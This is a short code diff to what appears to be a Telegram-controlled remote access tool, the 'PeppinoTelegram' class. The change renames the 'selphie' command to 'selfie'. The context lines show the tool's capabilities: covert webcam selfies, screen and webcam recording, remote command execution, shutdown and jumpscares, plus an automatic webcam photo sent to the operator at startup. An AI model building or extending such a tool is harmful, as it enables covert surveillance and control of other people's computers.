@@ -144,7 +144,7 @@ altf4 - Simulate Alt + F4.
 clear - Removes all cv2 windows, closes webcam and removes temporary files.
 
 📸 Camera & Screen
-selphie - Take a webcam selfie.
+selfie - Take a webcam selfie.
 screenshot - Capture screen.
 fullclip - Record screen + webcam.
 webcamclip - Record webcam.
@@ -690,7 +690,7 @@ class PeppinoTelegram:
             "breath":self.breath,
             "browser":browseropen,
             "execute":self.execute,
-            "selphie":self.selphie,
+            "selfie":self.selfie,
             "plankton":self.plankton,
             "shutdown":self.shutdown,
             "quickmenu":self.quickmenu,
@@ -806,7 +806,7 @@ class PeppinoTelegram:
     """
     def quickmenu(self):
         buttons = {
-            "Selphie":"selphie",
+            "selfie":"selfie",
             "Screenshot":"screenshot",
             "Jumpscare":"jumpscare",
             "Plankton":"plankton",
@@ -1205,7 +1205,7 @@ o888o  o888o o888ooooood8  `Y8bood8P'   `Y8bood8P'  o888o  o888o o888bood8P'   o
 
         self.bsend(output)
         
-    def selphie(self, caption: str|None=None) -> None:
+    def selfie(self, caption: str|None=None) -> None:
         try:
             filename = join(BURN_DIRECTORY,randompngname())
             self.opencap()
@@ -1499,7 +1499,7 @@ o888o        o88o     o8888o o888o  o888o 8""88888P'  o888o o8o        `8   `Y8b
         self.cantopenthread = Thread(target=self.cantopenkiller)
         self.cantopenthread.start()
         if not sys.argv[1:]:
-            if not self.selphie(f"Bot started: "+now()):
+            if not self.selfie(f"Bot started: "+now()):
                 self.bsend(f"Bot started: {now()}")
         else:
             self.bsend(f"Bot started: {now()}")
